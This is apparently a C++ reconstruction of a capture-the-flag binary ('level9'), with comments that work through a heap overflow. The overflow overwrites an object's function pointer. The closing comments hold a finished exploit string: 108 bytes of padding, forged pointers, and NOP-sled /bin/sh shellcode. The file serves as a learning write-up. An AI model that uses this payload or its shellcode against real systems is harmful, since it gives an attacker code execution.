#include <cstdlib>

class N
{
    public:
        N(int n) {}
        void setAnnotation(char *annotation) {}
        N& operator+(N& n) { return *this; }
        N& operator-(N& n) { return *this; }
};

int main(int argc, char **argv)
{
    if (argc < 1)
        exit(1);

    // operator new (108)
    N *n1 = new N(5); // _ZN1NC2Ei(&n, 0x5)
    // stored at esp+0x1c (0x0804a078)
    // [0x0804a078] = 0x08048848 (operator+)

    // [ Class itself ] [ next function ? ] [ Data ]

    // operator new (108)
    N *n2 = new N(6); // _ZN1NC2Ei(&n, 0x6) 
    // stored at esp+0x18 (0x0804a008)
    // 0x0804a008 + 4 = annotation (it's copied from argv[1])

    // EBP+0xC = Pointer to argv list (first pointer of argv**) = 0xbffff764
    // 0xbffff764 = list, so 0xbffff764[0] = argv[0] etc.
    // so [EBP + 0xC] = argv[0] = /home/user/level9/level9" = 0xbffff895

    // So when we see 
    //   0x08048664 <+112>:	mov    eax,DWORD PTR [ebp+0xc]
    //   0x08048667 <+115>:	add    eax,0x4
    //   0x0804866a <+118>:	mov    eax,DWORD PTR [eax]
    // it means load argv[1] into eax

    // esp+0x14 seems to be n2, it is passed as argument in asm
    n2->setAnnotation(argv[1]);

    // esp+0x10 seems to be n1, it is passed as argument in asm
    // if we dereference this (0x0804a078), we get 0x08048848
    // if we dereference again (0x08048848), we get 0804873a, which is the address of the function (operator+)

    // we can override n1 with n2, so that n1 is [ Class ] [ Pointer to next function jmp address ] [ Next function jmp address ]

    // n2 higher on the stack than n1, so we might overflow n2 and overwrite n1
    n1 + n2;

    // n2 buffer starts at 0x0804a00c, n1 start at 0x0804a078, so we need to overflow 0x0804a078 - 0x0804a00c = 0x6c (108) bytes to reach n1
    // tried in gdb, it works well, we reach the pointer to function pointer
    // next we need to change the pointer to function pointer
    
    //                          +------------------------+
    //                          |                        V       
    // [ Padding ] [ function address pointer ] [ function address ]
    // [ A * 108 ] [ 0x804a05c ] [ 0xb7d79be0 (exit) ]

    // "A"*108 + "\x7c\xa0\x04\x08" + "\xe0\x9b\xd7\xb7"

    // it works with exit, now time for shellcode

    // shellcode now copilot, new jump address is 0x804a038 (NOP sled)
    // "\x90"*(108-55) + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "\x7c\xa0\x04\x08" + "\x38\xa0\x04\x08"
}